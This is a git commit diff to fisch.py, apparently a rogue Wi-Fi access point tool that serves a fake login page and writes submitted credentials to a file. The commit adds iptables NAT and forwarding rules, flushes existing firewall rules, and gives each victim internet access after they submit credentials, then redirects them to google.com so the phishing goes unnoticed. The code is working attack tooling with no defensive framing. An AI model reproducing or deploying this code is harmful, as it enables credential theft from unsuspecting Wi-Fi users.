d926220308223241dce4c6ca838a416f0292cb5f
dadav <33197631+dadav@users.noreply.github.com>
2019-12-28 14:34:36 +0100

    Actually forward traffic

--- fisch.py
+++ fisch.py
@@ -31,9 +31,54 @@ class IFace:
         p.wait()
         return p.returncode in [0,2]
 
+    @staticmethod
+    def enable_forwarding():
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        os.system("echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")
+
+
+class IpTables:
+    FLUSH_COMMANDS = ["iptables -F", "iptables -t nat -F",  "iptables -t mangle -F", "iptables -X"]
+
+    @staticmethod
+    def exec(cmd):
+        return subprocess.Popen(cmd, shell=False, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
+
+    @staticmethod
+    def setup(wifi_iface):
+        p = IpTables.exec(f"iptables -A FORWARD -i {wifi_iface} -j DROP".split())
+        p.wait()
+
+    @staticmethod
+    def flush():
+        for cmd in IpTables.FLUSH_COMMANDS:
+            p = IpTables.exec(cmd.split())
+            p.wait()
+
+    @staticmethod
+    def allow(ip, wifi_iface, internet_iface):
+        # see https://github.com/oblique/create_ap/blob/master/create_ap#L1718
+
+        cmds = list()
+        # forward dns to google
+        cmds.append(f"iptables -t nat -A PREROUTING -i {wifi_iface} -p udp --dport 53 -j DNAT --to-destination 8.8.8.8:53")
+        cmds.append(f"iptables -t nat -A PREROUTING -i {wifi_iface} -p tcp --dport 53 -j DNAT --to-destination 8.8.8.8:53")
+        # nat
+        cmds.append(f"iptables -t nat -I POSTROUTING -s {ip} ! -o {wifi_iface} -j MASQUERADE")
+        # allow forwarding for this ip
+        cmds.append(f"iptables -I FORWARD -i {wifi_iface} -s {ip} -j ACCEPT")
+        cmds.append(f"iptables -I FORWARD -i {internet_iface} -d {ip} -j ACCEPT")
+
+        for cmd in cmds:
+            p = IpTables.exec(cmd.split())
+            p.wait()
+
+
 class FischHttpHandler(BaseHTTPRequestHandler):
     TEMPLATE = None
     OUTFILE = None
+    IFACES = (None, None)
+
     def _set_response(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
@@ -53,6 +98,16 @@ class FischHttpHandler(BaseHTTPRequestHandler):
                 parsed = parse_qs(post_data.decode('utf-8'))
                 with open(FischHttpHandler.OUTFILE, "a") as out:
                     out.write("[{}] {}\n".format(datetime.now(), str(parsed)))
+
+                wifi_iface, inet_iface = FischHttpHandler.IFACES
+
+                if wifi_iface and inet_iface:
+                    remote_ip = self.client_address[0]
+                    IpTables.allow(remote_ip, wifi_iface, inet_iface)
+                    self.send_response(302)
+                    self.send_header('Location', 'https://www.google.com')
+                    self.end_headers()
+                    return
             except Exception as ex:
                 logging.error(ex)
 
@@ -81,6 +136,7 @@ def main():
     parser.add_argument('--html-file', dest='template', help='File with the fake site.', required=True)
     parser.add_argument('--output-file', dest='outfile', help='File the credentials should be written to.', required=True)
     parser.add_argument('--iface', dest='iface', help='The interface which should be used.', required=True)
+    parser.add_argument('--inet-iface', dest='inet', help='The interface with internet.', required=False)
     parser.add_argument('--ssid', dest='ssid', help='The ssid of the rouge ap.', required=True)
     args = parser.parse_args()
 
@@ -123,6 +179,12 @@ def main():
 
     FischHttpHandler.TEMPLATE = open(args.template).read()
     FischHttpHandler.OUTFILE = args.outfile
+
+    if args.inet and os.path.exists(f"/sys/class/net/{args.inet}"):
+        FischHttpHandler.IFACES = (args.iface, args.inet)
+        IpTables.flush()
+        IpTables.setup(args.iface)
+        IFace.enable_forwarding()
 
     web = HTTPServer(('192.168.66.2', 80), FischHttpHandler)
     return web.serve_forever()
